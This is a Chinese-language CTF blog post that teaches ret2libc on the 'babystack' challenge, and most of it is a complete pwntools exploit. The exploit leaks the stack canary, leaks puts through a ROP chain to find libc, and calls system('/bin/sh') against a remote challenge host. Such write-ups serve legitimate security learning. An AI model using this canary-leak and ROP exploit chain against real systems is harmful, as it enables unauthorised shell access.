---
layout: post
title: ""
date:   2022-11-22
tags: [pwn]
comments: true
author: gbeefee
	
---

​	ret2libc，终于还是要搞明白了，继续栈的学习理论知识😌，下周就去学堆。

#### 0x0 

​	不同于ret2text，在程序中通常可以找的明显的system()或“/bin/sh”，没有的东西就只能靠手搓了。ret2libc的目标就是在程序中泄露出某一函数（通常是puts和write）的真实地址，根据这个地址获取对于版本的libc，在libc里就存在需要的sysem()和“/bin/sh"，再通过ROP，把它们拼成最后的栈溢出payload，获取shell的控制权。

#### 0x1

​	要泄露一个函数的真实地址，就不得不提到plt表和got表以及延迟绑定机制了。got表也叫全局偏移表，是Linux ELF文件中用于定位全局变量和函数的一个表。plt表也叫过程链接表，是用来存储外部函数在内存的确切地址，即函数第一次被调用的时候才进行绑定。在Linux系统中，为了节约程序运行的空间，函数只有在第一次执行后，才会完成got表和plt表的绑定。也就是说，在第二次调用后，got表才可以直接调用函数。

#### 0x2

例题：攻防世界pwn-1

![checksec](https://github.com/gbeefee/imghome/blob/4b62d12cff42a86998bbea6d5a36711a8f590d67/checksec.png)

没有pie保护

![main](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/main.png)

![menu](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/menu.png)

不存在后门，有很明显的溢出点，但是有canary保护，需要先泄露canary。

canary的最后一位是\x00，但是puts函数读取到\x00就会自动停止，第一次输入b'a'*0x80\n，最后一个字节正好把\x00覆盖，puts函数就会连带把canary一起打印，之后再把\x00补上，就成功泄露了canary。

`io.sendlineafter(">>",'1')`

`io.sendline(b'a'*0x88)`

`io.sendlineafter(">>",'2')`

`io.recvuntil('a\n')`

`canary = u64(io.recv(7).rjust(8,b'\x00'))`

泄露puts的真实地址，这里需要使用ROPgadget获取pop_rdi。

`payload1 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)`

`io.sendlineafter(">> ",'1')`

`io.sendline(payload1)`

`io.sendlineafter(">> ",'3')`

`puts_addr = u64(io.recv(6).ljust(8,b'\x00'))`

`print(hex(puts_addr))`

最后通过偏移计算出system和binsh的地址

`libc = LibcSearcher('puts', puts_addr)`

`libc_base = puts_addr - libc.dump('puts')`

`system = libc_base + libc.dump('system')`

`binsh = libc_base + libc.dump('str_bin_sh')`

`io.sendlineafter('>> ','1')`

`payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)`

`io.send(payload2)`

`io.sendlineafter('>> ','3')`

`io.interactive()`

结果如图

![result](https://github.com/gbeefee/imghome/blob/d06adada018f27833ce7abfd67a222cafc80a53c/result.png)

完整exp：

`from pwn import *`

`from LibcSearcher import *`

`context(os="linux", arch="amd64", log_level="debug")`

`elf = ELF("./babystack")`

`io=remote("61.147.171.105", 57778)`

`\#io=process("./babystack")`

`main_addr=0x0400908`

`pop_rdi = 0x0400a93`

`puts_got = elf.got['puts']`

`puts_plt = elf.plt['puts']`

`io.sendlineafter(">>",'1')`

`io.sendline(b'a'*0x88)`

`io.sendlineafter(">>",'2')`

`io.recvuntil('a\n')`

`canary = u64(io.recv(7).rjust(8,b'\x00'))`

`payload2 = b'A'*0x88 + p64(canary) + p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)`

`io.sendlineafter(">> ",'1')`

`io.sendline(payload2)`

`io.sendlineafter(">> ",'3')`

`puts_addr = u64(io.recv(6).ljust(8,b'\x00'))`

`libc = LibcSearcher('puts', puts_addr)`

`libc_base = puts_addr - libc.dump('puts')`

`system = libc_base + libc.dump('system')`

`binsh = libc_base + libc.dump('str_bin_sh')`

`io.sendlineafter('>> ','1')`

`payload2 ='a'*0x88 + p64(canary) +p64(0)+ p64(pop_rdi) + p64(binsh) + p64(system)`

`io.send(payload2)`

`io.sendlineafter('>> ','3')`

`io.interactive()`

